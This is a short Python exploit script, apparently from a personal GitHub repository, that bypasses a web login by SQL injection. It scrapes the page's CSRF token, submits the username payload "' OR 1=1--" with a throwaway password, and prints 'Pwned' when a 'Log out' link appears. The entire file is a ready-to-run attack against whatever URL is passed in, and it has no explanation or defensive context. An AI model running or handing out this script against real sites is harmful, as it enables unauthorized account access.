#!/usr/bin/env python3
# https://github.com/wvverez
# SQL injection vulnerability allowing login bypass

import requests as req
from sys import argv as av
from re import search

t=av[1] if len(av)==2 else exit(f"[+] Uso: {av[0]} <url>")
s=req.Session()
r=s.get(t)
csrf=search(r'name="csrf" value="([^"]+)"', r.text).group(1)
r=s.post(t, data={"csrf":csrf,"username":"' OR 1=1--","password":"x"})

print("[+] Pwned" if "Log out" in r.text else "[-] Fail")